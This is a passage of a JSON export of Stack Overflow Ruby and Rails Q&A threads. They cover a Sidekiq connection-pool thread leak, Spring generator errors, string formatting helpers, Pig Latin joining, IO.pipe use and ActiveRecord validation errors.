"comment_id": 115791041, "body": "We&#39;re having the same issue on rails 5.2.4 and ruby 2.6.1. Trying to both upgrade to rails 6.1 and will try to downgrade our applications to solve this nightmare. The same code on rails 4 worked flawlessly. We also tried puma, thin and unicorn, all of them had the same issue, so its a rails issue and not server. Nearly each user request generates a new thread that never dies. We also use a multi-tenant approach."}], "answers": [{"comments": [{"owner": {"reputation": 73, "user_id": 4708393, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b17b6effea410fe3b9e148c6c0a14c62?s=128&d=identicon&r=PG&f=1", "display_name": "Kate Wilkins", "link": "https://stackoverflow.com/users/4708393/kate-wilkins"}, "edited": false, "score": 0, "creation_date": 1558611945, "post_id": 56243773, "comment_id": 99163477, "body": "We removed the Open3.capture3 from the code as a test and it was still throwing out threads, would appear not to be related. Thanks for taking an interest."}], "tags": [], "owner": {"reputation": 16587, "user_id": 177053, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f6c516626d381a1ea383cedd1799486?s=128&d=identicon&r=PG", "display_name": "Vasfed", "link": "https://stackoverflow.com/users/177053/vasfed"}, "is_accepted": false, "score": 1, "last_activity_date": 1558460599, "creation_date": 1558460599, "answer_id": 56243773, "question_id": 56242038, "link": "https://stackoverflow.com/questions/56242038/sidekiq-running-out-of-threads-rails-leaving-and-not-reaping-connection-pool/56243773#56243773", "title": "Sidekiq, running out of threads - Rails leaving and not reaping connection_pool threads", "body": "<p>First identify rate at which threads leak - does it happen per each task run or sporadically over time? If former - you're lucky and can try debugging by logging <code>ObjectSpace.each_object(Thread).count</code> (beware, it's a heavy function, may not be suitable for highload in production) in several points in your code to try to detect where threads leak.</p>\n\n<p>Suspect is the <code>Open3.capture3</code> - it launches two threads for reading stdin/stdout of the process and one more for reading process exit status, if you do not use separate stderr in your C code - I'd suggest switching to <code>capture2</code> and seeing if threads leak around 1/3 times slower. I remember having issues with popen3 and child process not using stderr or some combination of opening/closing std streams or not reading stdin, cannot recall details now.</p>\n"}, {"tags": [], "owner": {"reputation": 73, "user_id": 4708393, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b17b6effea410fe3b9e148c6c0a14c62?s=128&d=identicon&r=PG&f=1", "display_name": "Kate Wilkins", "link": "https://stackoverflow.com/users/4708393/kate-wilkins"}, "is_accepted": false, "score": 0, "last_activity_date": 1558606123, "creation_date": 1558606123, "answer_id": 56272907, "question_id": 56242038, "link": "https://stackoverflow.com/questions/56242038/sidekiq-running-out-of-threads-rails-leaving-and-not-reaping-connection-pool/56272907#56272907", "title": "Sidekiq, running out of threads - Rails leaving and not reaping connection_pool threads", "body": "<p>Not an answer but an update on the issue, one of our servers went down again this morning with 31000+ threads on one of the sidekiq tasks.</p>\n\n<p>It looks like this is an issue with Rails ActiveRecord, we can successfully leave sleeping threads behind with some test code. It's the 'CoreDBListModel.connection.close' thats putting the connection pool to sleep and it's never reaped because of its state.</p>\n\n<p>It looks like the issue for us started when we migrated from Rails 5.1.5 to 5.2.1, if we roll back to that version the issue goes away, the issue also seems to be present in Rails 6 as a similar issue also raised by someone else, slightly different name but same issue:</p>\n\n<p><a href=\"https://github.com/rails/rails/issues/36333\" rel=\"nofollow noreferrer\">https://github.com/rails/rails/issues/36333</a></p>\n"}], "owner": {"reputation": 73, "user_id": 4708393, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b17b6effea410fe3b9e148c6c0a14c62?s=128&d=identicon&r=PG&f=1", "display_name": "Kate Wilkins", "link": "https://stackoverflow.com/users/4708393/kate-wilkins"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 532, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1558606347, "creation_date": 1558453832, "last_edit_date": 1558606347, "question_id": 56242038, "link": "https://stackoverflow.com/questions/56242038/sidekiq-running-out-of-threads-rails-leaving-and-not-reaping-connection-pool", "title": "Sidekiq, running out of threads - Rails leaving and not reaping connection_pool threads", "body": "<p>We have a production system running in the following config:</p>\n\n<pre><code>Ruby 2.5.1\nRails 5.2.2\nSidekiq 5.2.5\nSidekiq-cron 1.1.0\nRedis 4.1.0\n</code></pre>\n\n<pre><code>  adapter: postgresql\n  pool: 10\n  reaping_frequency: 10\n  timeout: 5000\n  username: ...\n  password: ...\n  host: ...\n</code></pre>\n\n<p>It has 3 queues (default/high/med priority), each with 4 threads. We recently added a new sidekiq cron job that runs every 30 mins in the high queue and after a couple of days the system just goes into gridlock and no more threads can be spawned for connection pools. We've traced it to the 'high' queue and this new job, last time it hung up this 'high' queue had 1900 threads, almost all of which look to be 'connection pool'. A <code>kill -9</code> on the process for the queue and our supervisor restarts it and all is great again for a 5-7 days and then its down again.</p>\n\n<p>This new job creates a number of new lists in a remote DB, we have the local ActiveRecord model for the local records and a superclass RemoteList model. We use <code>RemoteModel.establish_connection...</code>. transaction open, write, write..., close transaction, close connection. We talk to a large number of remote DBs and so this model works well for us.</p>\n\n<p>The new worker is repeatedly calling out to the list publisher which has been in use for 3+ years with no lockup issued. We can see one new connection pool process get added each time we write to the remote DB via the old list publisher.</p>\n\n<p>I've tried:</p>\n\n<ol>\n<li>Manually getting connection from the pool and returning, for both ActiveRecord itself and our super class, one, both, none.</li>\n<li>Wrapping the block in <code>ActiveRecord::Base.connection_pool.with_connection</code></li>\n</ol>\n\n<p>Neither of the above has any impact and the thread count just continually grows with each file we split out until we reach deadlock and no more threads. Reaping just doesn't seem to be doing anything at all. The only thing different in this worker is that it calls out to <code>open3.capture3</code> to a 'C' programme to do some file splitting much faster than we can do in ruby but I can see that the spawned shell has closed and completed but still we get these 'connection pool' threads.</p>\n\n<p>Anyone out there have any good ideas.</p>\n\n<p>Thanks\nKate</p>\n\n<p>List Publish</p>\n\n<pre><code>CoreDBListModel.semaphore.synchronize do\n    begin\n\n      .... setup removed....\n      CoreDBListModel.establish_connection(@config['database'])\n\n      CoreDBListModel.transaction do\n        core = CoreDBListModel.where(:description =&gt; list.list_id).first\n        core.pending = true\n        core.name = list.name\n        core.tags = category.name\n        core.pcount = list.count\n        core.active = list.deleted ? 2:0\n        core.save\n\n        ... make list insert data.....\n        mass_insert = \"INSERT INTO #{mapping['table']} (data_id, data, fulldata) VALUES #{inserts.join(\", \")}\"\n        CoreDBListModel.connection.execute(mass_insert)\n\n      # Mark as completed\n        core.pending = false\n        core.save\n\n      end\n\n    rescue =&gt; e\n      @code = 500\n      @message = \"Failed - #{e.message}, #{e.backtrace[0]}\"\n      Rails.logger.error(\"CoreDBList() - Publishing failed - #{list.list_id}\")\n      Rails.logger.error(\"CoreDBList() - Publishing failed - #{e.message}\")\n      Rails.logger.error(\"CoreDBList() - Publishing failed - #{e.backtrace.first(10).join(\"\\n\")}\")\n    ensure\n      begin\n        # Close our DB connection\n        CoreDBListModel.connection.close\n      rescue\n      end\n    end\n  end\n</code></pre>\n\n<p>Have added an answer below with more details but basically the issue looks to be with Rails somewhere between 5.1.6 and 5.2.1. If we roll back to 5.1.6 the problem goes away.</p>\n\n<p><a href=\"https://github.com/rails/rails/issues/36333\" rel=\"nofollow noreferrer\">https://github.com/rails/rails/issues/36333</a></p>\n"}, {"tags": ["ruby"], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 11534128, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/665a0bc65b961d70c845186b82f2e827?s=128&d=identicon&r=PG&f=1", "display_name": "erka", "link": "https://stackoverflow.com/users/11534128/erka"}, "edited": false, "score": 0, "creation_date": 1558469030, "post_id": 56240535, "comment_id": 99109658, "body": "Yepp, I understand now. Thank you so much for taking the time to help me!"}], "tags": [], "owner": {"reputation": 1464, "user_id": 5935198, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e36ba5b69b43af8e8ef7ddcc43d93b27?s=128&d=identicon&r=PG", "display_name": "RousseauAlexandre", "link": "https://stackoverflow.com/users/5935198/rousseaualexandre"}, "is_accepted": true, "score": 4, "last_activity_date": 1558453776, "last_edit_date": 1558453776, "creation_date": 1558448984, "answer_id": 56240535, "question_id": 56240248, "link": "https://stackoverflow.com/questions/56240248/display-information-for-each-person/56240535#56240535", "title": "&quot;Display information for each person&quot;", "body": "<p>Actually your <code>my_group</code> contains only <code>Strings</code>. If you want to include <strong>persons variable</strong> you may include them as <strong>variables</strong> (without <code>\"\"</code>):</p>\n\n<pre><code>person_1 = {name: \"erik\", gender: \"male\", age: 26}\nperson_2 = {name: \"erika\", gender: \"female\", age: 26}\nperson_3 = {name: \"erka\", gender: \"alpha\", age: 27}\n\nmy_group = [ person_1, person_2, person_3 ]\n</code></pre>\n\n<p>Then you can use <a href=\"https://ruby-doc.org/core-2.6.3/Array.html#method-i-each\" rel=\"nofollow noreferrer\"><code>Array#each</code></a> method to loop on each <strong>person</strong> into this array. </p>\n\n<pre><code>my_group.each do |person|\n     puts \"Hello, #{person[:name]} is about #{person[:age]} years old\"\nend\n</code></pre>\n\n<p>Also note that each person is a <a href=\"https://ruby-doc.org/core-2.6.3/Hash.html\" rel=\"nofollow noreferrer\"><code>Hash</code></a>. If you want to access to age property of <code>person_1</code>, for example, you have to do this:</p>\n\n<pre><code>puts person_1[:name]\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 11534128, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/665a0bc65b961d70c845186b82f2e827?s=128&d=identicon&r=PG&f=1", "display_name": "erka", "link": "https://stackoverflow.com/users/11534128/erka"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 56240535, "answer_count": 1, "score": 2, "last_activity_date": 1558474200, "creation_date": 1558448082, "last_edit_date": 1558474200, "question_id": 56240248, "link": "https://stackoverflow.com/questions/56240248/display-information-for-each-person", "title": "&quot;Display information for each person&quot;", "body": "<p>I can't get the code to display the information about the people correctly. I'm able to list the names but not the ages.</p>\n\n<pre><code>my_group = [\"person_1\", \"person_2\", \"person_3\"]\nperson_1 = {name: \"erik\", gender: \"male\", age: 26}\nperson_2 = {name: \"erika\", gender: \"female\", age: 26}\nperson_3 = {name: \"erka\", gender: \"alpha\", age: 27}\n\nmy_group.each do |name|\n  my_group.each do |age|\n    puts \"Hello, #{name} is about #{age} years old\"\n  end\n\n  puts \"Hello, #{name} is about #{age} years old\"\nend\n</code></pre>\n\n<p>I don't get an error code, but it does not list the age with the names.</p>\n"}, {"tags": ["ruby", "rubygems", "ruby-on-rails-5"], "answers": [{"comments": [{"owner": {"reputation": 8733, "user_id": 3625433, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/N7qK6.png?s=128&g=1", "display_name": "lacostenycoder", "link": "https://stackoverflow.com/users/3625433/lacostenycoder"}, "reply_to_user": {"reputation": 143, "user_id": 5736112, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4a4992e47e824469a2096ccc288f0b2a?s=128&d=identicon&r=PG&f=1", "display_name": "MaxRah", "link": "https://stackoverflow.com/users/5736112/maxrah"}, "edited": false, "score": 0, "creation_date": 1558621662, "post_id": 56241794, "comment_id": 99169195, "body": "@MaxRah glad this fixed your problem. and if so, perhaps consider marking this as accepted the answer."}], "tags": [], "owner": {"reputation": 8733, "user_id": 3625433, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/N7qK6.png?s=128&g=1", "display_name": "lacostenycoder", "link": "https://stackoverflow.com/users/3625433/lacostenycoder"}, "is_accepted": true, "score": 4, "last_activity_date": 1558453011, "creation_date": 1558453011, "answer_id": 56241794, "question_id": 56240115, "link": "https://stackoverflow.com/questions/56240115/spring-error-when-creating-a-new-model-in-rails/56241794#56241794", "title": "Spring error when creating a new model in Rails", "body": "<p>I think this is a known issue but you should be able to run one-off rails command without stopping spring by using this:</p>\n\n<pre><code>DISABLE_SPRING=1 rails generate model Product title:string release_date:date release_time:time description:text price:decimal brand:string\n</code></pre>\n\n<p>Or you can first stop spring by running <code>spring stop</code></p>\n\n<p>See answers here as well <a href=\"https://stackoverflow.com/questions/23165506/rails-spring-breaking-generators\">Rails Spring breaking generators</a></p>\n"}], "owner": {"reputation": 143, "user_id": 5736112, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4a4992e47e824469a2096ccc288f0b2a?s=128&d=identicon&r=PG&f=1", "display_name": "MaxRah", "link": "https://stackoverflow.com/users/5736112/maxrah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 476, "favorite_count": 0, "accepted_answer_id": 56241794, "answer_count": 1, "score": 2, "last_activity_date": 1558453011, "creation_date": 1558447637, "last_edit_date": 1558449039, "question_id": 56240115, "link": "https://stackoverflow.com/questions/56240115/spring-error-when-creating-a-new-model-in-rails", "title": "Spring error when creating a new model in Rails", "body": "<p>I'm trying to create a new model in a Rails API-only app but I geta \"cannot load such file\" error message:</p>\n\n<pre><code>/Users/max/.rvm/gems/ruby-2.6.3/gems/spring-2.0.2/lib/spring/application.rb:171:in `fork': cannot load such file -- rails/generators/model/model/model_generator (LoadError)\n/Users/max/.rvm/gems/ruby-2.6.3/gems/spring-2.0.2/lib/spring/application.rb:171:in `fork': undefined method `reject!' for nil:NilClass (NoMethodError)\n/Users/max/.rvm/gems/ruby-2.6.3/gems/spring-2.0.2/lib/spring/application.rb:171:in `fork': undefined method `join' for nil:NilClass (NoMethodError)\n/Users/max/.rvm/gems/ruby-2.6.3/gems/spring-2.0.2/lib/spring/application.rb:171:in `fork': undefined method `reject!' for nil:NilClass (NoMethodError)\n/Users/max/.rvm/gems/ruby-2.6.3/gems/spring-2.0.2/lib/spring/application.rb:171:in `fork': undefined method `reject!' for nil:NilClass (NoMethodError)\n/Users/max/.rvm/gems/ruby-2.6.3/gems/spring-2.0.2/lib/spring/application.rb:171:in `fork': undefined method `reject!' for nil:NilClass (NoMethodError)\n</code></pre>\n\n<p>I've changed the ruby versions but that didn't work.</p>\n\n<pre><code>rails generate model Product title:string release_date:date release_time:time description:text price:decimal brand:string\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 317, "user_id": 8340945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db46d63dd0633b33417fbf4289f38e40?s=128&d=identicon&r=PG&f=1", "display_name": "Diana", "link": "https://stackoverflow.com/users/8340945/diana"}, "edited": false, "score": 0, "creation_date": 1558446617, "post_id": 56239758, "comment_id": 99098321, "body": "did you also look at this answer? <a href=\"https://stackoverflow.com/a/11411200/8340945\">stackoverflow.com/a/11411200/8340945</a>"}, {"owner": {"reputation": 1458, "user_id": 4230220, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-M6gI9NNnr0k/AAAAAAAAAAI/AAAAAAAAAB8/8quus1Eouio/photo.jpg?sz=128", "display_name": "Dani Vijay", "link": "https://stackoverflow.com/users/4230220/dani-vijay"}, "reply_to_user": {"reputation": 317, "user_id": 8340945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db46d63dd0633b33417fbf4289f38e40?s=128&d=identicon&r=PG&f=1", "display_name": "Diana", "link": "https://stackoverflow.com/users/8340945/diana"}, "edited": false, "score": 0, "creation_date": 1558446785, "post_id": 56239758, "comment_id": 99098422, "body": "Looks like it can be modded to the purpose, but I prefer something more precise."}], "answers": [{"comments": [{"owner": {"reputation": 317, "user_id": 8340945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db46d63dd0633b33417fbf4289f38e40?s=128&d=identicon&r=PG&f=1", "display_name": "Diana", "link": "https://stackoverflow.com/users/8340945/diana"}, "edited": false, "score": 0, "creation_date": 1558446693, "post_id": 56239821, "comment_id": 99098367, "body": "shouldn&#39;t it be like this for camel case? text.upcase_first.gsub(&#39;_&#39;, &#39;&#39;)"}], "tags": [], "owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "is_accepted": false, "score": 1, "last_activity_date": 1558446600, "creation_date": 1558446600, "answer_id": 56239821, "question_id": 56239758, "link": "https://stackoverflow.com/questions/56239758/converting-snake-case-to-normal-sentence-in-ruby/56239821#56239821", "title": "Converting snake case to normal sentence in Ruby", "body": "<p>Rails 5 brought in a new <code>upcase_first</code> method:\n<a href=\"https://glaucocustodio.github.io/2016/05/19/rails-5-new-upcase-first-method/\" rel=\"nofollow noreferrer\">https://glaucocustodio.github.io/2016/05/19/rails-5-new-upcase-first-method/</a></p>\n\n<p>Combine this with subbing all underscores with spaces and you should be good:</p>\n\n<pre><code>text = 'hello_world'\n\ntext.upcase_first.gsub('_', ' ')\n=&gt; 'Hello world'\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 30655, "user_id": 138557, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/73c04e9ef9ca435c5b19a2e765ae6d20?s=128&d=identicon&r=PG", "display_name": "Max Williams", "link": "https://stackoverflow.com/users/138557/max-williams"}, "is_accepted": false, "score": 4, "last_activity_date": 1558446719, "creation_date": 1558446719, "answer_id": 56239855, "question_id": 56239758, "link": "https://stackoverflow.com/questions/56239758/converting-snake-case-to-normal-sentence-in-ruby/56239855#56239855", "title": "Converting snake case to normal sentence in Ruby", "body": "<pre><code>\"hello_world\".capitalize.gsub(\"_\",\" \")\n=&gt; \"Hello world\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2390, "user_id": 4812050, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/hzLjT.jpg?s=128&g=1", "display_name": "Cruz Nunez", "link": "https://stackoverflow.com/users/4812050/cruz-nunez"}, "is_accepted": false, "score": 8, "last_activity_date": 1558453568, "creation_date": 1558453568, "answer_id": 56241953, "question_id": 56239758, "link": "https://stackoverflow.com/questions/56239758/converting-snake-case-to-normal-sentence-in-ruby/56241953#56241953", "title": "Converting snake case to normal sentence in Ruby", "body": "<p>Rails has a method called <a href=\"https://apidock.com/rails/ActiveSupport/Inflector/titleize\" rel=\"noreferrer\"><code>titleize</code></a></p>\n\n<pre><code>\"hello_world\".titleize # =&gt; \"Hello World\"\n</code></pre>\n\n<p>Ruby has a method called <a href=\"https://apidock.com/ruby/String/capitalize\" rel=\"noreferrer\"><code>capitalize</code></a></p>\n\n<pre><code>\"hello_world\".capitalize # =&gt; \"Hello_world\"\n</code></pre>\n\n<p>If you want \"Hello world\" with only the \"H\" capitalized, combine them both (in Rails).</p>\n\n<pre><code>\"hello_world\".titleize.capitalize # =&gt; \"Hello world\"\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3820, "user_id": 1163551, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e2164ebad12d89c9bc9c689016d3aae1?s=128&d=identicon&r=PG", "display_name": "Sash", "link": "https://stackoverflow.com/users/1163551/sash"}, "edited": false, "score": 1, "creation_date": 1595771175, "post_id": 56243538, "comment_id": 111583303, "body": "This requires Rails."}], "tags": [], "owner": {"reputation": 1580, "user_id": 4041883, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CE0SX.jpg?s=128&g=1", "display_name": "CAmador", "link": "https://stackoverflow.com/users/4041883/camador"}, "is_accepted": true, "score": 5, "last_activity_date": 1558459613, "creation_date": 1558459613, "answer_id": 56243538, "question_id": 56239758, "link": "https://stackoverflow.com/questions/56239758/converting-snake-case-to-normal-sentence-in-ruby/56243538#56243538", "title": "Converting snake case to normal sentence in Ruby", "body": "<p><a href=\"https://api.rubyonrails.org/v5.2.3/classes/String.html#method-i-humanize\" rel=\"noreferrer\">humanize</a> is your thing:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>[4] pry(main)&gt; \"hello_world\".humanize\n\"Hello world\"\n</code></pre>\n"}], "owner": {"reputation": 1458, "user_id": 4230220, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-M6gI9NNnr0k/AAAAAAAAAAI/AAAAAAAAAB8/8quus1Eouio/photo.jpg?sz=128", "display_name": "Dani Vijay", "link": "https://stackoverflow.com/users/4230220/dani-vijay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2279, "favorite_count": 0, "accepted_answer_id": 56243538, "answer_count": 4, "score": 2, "last_activity_date": 1558459613, "creation_date": 1558446444, "last_edit_date": 1558446569, "question_id": 56239758, "link": "https://stackoverflow.com/questions/56239758/converting-snake-case-to-normal-sentence-in-ruby", "title": "Converting snake case to normal sentence in Ruby", "body": "<p>I'm trying to convert a string in snake case to normal case(Eg: \"hello_world\" to \"Hello world\")</p>\n\n<p>I'm pretty new to ruby, and I'm using it with Rails. I found this question <a href=\"https://stackoverflow.com/questions/9524457/converting-string-from-snake-case-to-camelcase-in-ruby/39716710\">Converting string from snake_case to CamelCase in Ruby</a>, and it seems like there is a function for that usecase (<code>.camelize</code>). Is there anything that I can use inbuilt like that? If not, how can I achieve this?</p>\n"}, {"tags": ["ruby"], "owner": {"reputation": 1838, "user_id": 3692286, "user_type": "registered", "accept_rate": 48, "profile_image": "https://i.stack.imgur.com/deAJz.jpg?s=128&g=1", "display_name": "jleeothon", "link": "https://stackoverflow.com/users/3692286/jleeothon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 25, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1558443505, "creation_date": 1558443505, "question_id": 56238858, "link": "https://stackoverflow.com/questions/56238858/short-way-to-make-a-more-io-like-stringio", "title": "Short way to make a more IO-like StringIO", "body": "<p>I want to run something like</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>IO.pipe do |readable, writable|\n  writable.write \"some long text\"\n  writable.close\n  spawn(\"command\", \"arg\", in: readable)\nend\n</code></pre>\n\n<p>Can we turn it into something shorter?</p>\n\n<p>I tried <code>spawn \"command\", \"arg\", in: StringIO.new(\"text\")</code> but <code>StringIO</code> does not implement all the necessary methods to be used as a proper IO object.</p>\n"}, {"tags": ["arrays", "ruby", "string"], "comments": [{"owner": {"reputation": 1, "user_id": 8924092, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce756969adaa30600e9460b93be5f045?s=128&d=identicon&r=PG&f=1", "display_name": "Caiof", "link": "https://stackoverflow.com/users/8924092/caiof"}, "edited": false, "score": 0, "creation_date": 1558443438, "post_id": 56238781, "comment_id": 99096347, "body": "Possible duplicate of: <a href=\"https://stackoverflow.com/questions/3500814/ruby-array-to-string-conversion\" title=\"ruby array to string conversion\">stackoverflow.com/questions/3500814/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 3115449, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/a0Y65.jpg?s=128&g=1", "display_name": "Joe-t", "link": "https://stackoverflow.com/users/3115449/joe-t"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1558449487, "post_id": 56239130, "comment_id": 99100140, "body": "@david No point - just got left behind when I added in the {}"}], "tags": [], "owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "is_accepted": false, "score": 0, "last_activity_date": 1558444440, "creation_date": 1558444440, "answer_id": 56239130, "question_id": 56238781, "link": "https://stackoverflow.com/questions/56238781/cant-return-strings-from-arrays-pig-latin-ruby/56239130#56239130", "title": "Can&#39;t return strings from arrays - pig latin - Ruby", "body": "<p>You've done all the hard work and got an array of strings you want to join together, now you just need to join them:</p>\n\n<pre><code>def pig_it text\n  text.split.map.each { |word| word.chars.rotate(1).join+\"ay\"}.join(' ')\nend\n\ntext = 'Pig latin is cool'\n\npig_it(text)\n=&gt; \"igPay atinlay siay oolcay\"\n</code></pre>\n\n<p>Whatever argument you feed into join will be the character used inbetween array elements</p>\n"}, {"tags": [], "owner": {"reputation": 4688, "user_id": 6241184, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/1022848011119215/picture?type=large", "display_name": "Vinicius Brasil", "link": "https://stackoverflow.com/users/6241184/vinicius-brasil"}, "is_accepted": true, "score": 2, "last_activity_date": 1558466363, "last_edit_date": 1558466363, "creation_date": 1558448685, "answer_id": 56240434, "question_id": 56238781, "link": "https://stackoverflow.com/questions/56238781/cant-return-strings-from-arrays-pig-latin-ruby/56240434#56240434", "title": "Can&#39;t return strings from arrays - pig latin - Ruby", "body": "<ol>\n<li><p>Remove the <code>#each</code> call from <code>text.split.map.each { |word| word.chars.rotate(1).join+\"ay\"}</code>. The map call takes a block as argument. There is no point of having that <code>#each</code> call.</p></li>\n<li><p>You need another <code>#join</code> after the <code>#map</code> That will, for instance, transform <code>[\"hello\", \"world\"]</code> into <code>\"hello world\"</code>.</p></li>\n</ol>\n\n<p>And then you'll have:</p>\n\n<pre><code>def pig_it(text)\n  text.split.map { |word| word.chars.rotate(1).join + \"ay\" }.join(\" \")\nend\n\ntext = \"Pig latin is cool\"\npig_it(text)\n#=&gt; \"igPay atinlay siay oolcay\"\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 3115449, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/a0Y65.jpg?s=128&g=1", "display_name": "Joe-t", "link": "https://stackoverflow.com/users/3115449/joe-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "accepted_answer_id": 56240434, "answer_count": 2, "score": 0, "last_activity_date": 1558466363, "creation_date": 1558443217, "last_edit_date": 1558447515, "question_id": 56238781, "link": "https://stackoverflow.com/questions/56238781/cant-return-strings-from-arrays-pig-latin-ruby", "title": "Can&#39;t return strings from arrays - pig latin - Ruby", "body": "<p>I am trying to do a Pig Latin Kata on Codewars and I'm really struggling to return the strings in the array as a string. </p>\n\n<p>Not sure where I'm going wrong - any help would be really appreciated. </p>\n\n<pre><code>def pig_it text\n  text.split.map.each { |word| word.chars.rotate(1).join+\"ay\"}\nend\n\ntext = 'Pig latin is cool'\n\npig_it(text)\n</code></pre>\n\n<p>It returns the array and the pig latin translation works fine. Cannot figure out how to return it as a string. \n<code>[\"igPay\", \"atinlay\", \"siay\", \"oolcay\"]</code></p>\n"}, {"tags": ["ruby-on-rails", "ruby", "validation"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 11526842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5cd80701396164df7921ab9cbec0ec31?s=128&d=identicon&r=PG&f=1", "display_name": "Papy Poule", "link": "https://stackoverflow.com/users/11526842/papy-poule"}, "edited": false, "score": 0, "creation_date": 1558440879, "post_id": 56238018, "comment_id": 99094818, "body": "That was the solution, thanks ! OpenClassrooms didn&#39;t mention that (at least in my language)"}], "tags": [], "owner": {"reputation": 4688, "user_id": 6241184, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/1022848011119215/picture?type=large", "display_name": "Vinicius Brasil", "link": "https://stackoverflow.com/users/6241184/vinicius-brasil"}, "is_accepted": false, "score": 1, "last_activity_date": 1558440673, "creation_date": 1558440673, "answer_id": 56238018, "question_id": 56237998, "link": "https://stackoverflow.com/questions/56237998/how-to-get-validations-error-messages-in-ruby-on-rails/56238018#56238018", "title": "How to get validations error messages in Ruby on rails?", "body": "<p>Call <code>me.validate</code> before checking the error object. You can also call <code>#valid?</code>.</p>\n\n<pre><code>me = Person.new name: \"\"\nme.validate\nme.errors.to_hash\n=&gt; { ... }\n</code></pre>\n\n<p>All saving methods call this <code>#validate</code> method internally, such as <code>#save</code> and <code>#save!</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "is_accepted": true, "score": 2, "last_activity_date": 1558441004, "creation_date": 1558441004, "answer_id": 56238102, "question_id": 56237998, "link": "https://stackoverflow.com/questions/56237998/how-to-get-validations-error-messages-in-ruby-on-rails/56238102#56238102", "title": "How to get validations error messages in Ruby on rails?", "body": "<p>Errors are added to an object after validation. When you call <code>new</code>, you're not validating anything, so the object has no errors.</p>\n\n<p>If you try and save it and then check the errors, you will get what you're looking for:</p>\n\n<pre><code>me = Person.new name:\"\"\nme.errors.to_hash\n=&gt; {}\n</code></pre>\n\n<pre><code>me = Person.new name:\"\"\nme.save\n=&gt; false\nme.errors.to_hash\n=&gt; ActiveModel::Errors...\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 11526842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5cd80701396164df7921ab9cbec0ec31?s=128&d=identicon&r=PG&f=1", "display_name": "Papy Poule", "link": "https://stackoverflow.com/users/11526842/papy-poule"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 327, "favorite_count": 0, "accepted_answer_id": 56238102, "answer_count": 2, "score": 1, "last_activity_date": 1558441004, "creation_date": 1558440599, "question_id": 56237998, "link": "https://stackoverflow.com/questions/56237998/how-to-get-validations-error-messages-in-ruby-on-rails", "title": "How to get validations error messages in Ruby on rails?", "body": "<p>I'm currently learning Ruby on rails with OpenClassrooms, and they are using that piece of code :</p>\n\n<pre><code>validates :name, presence: {\n    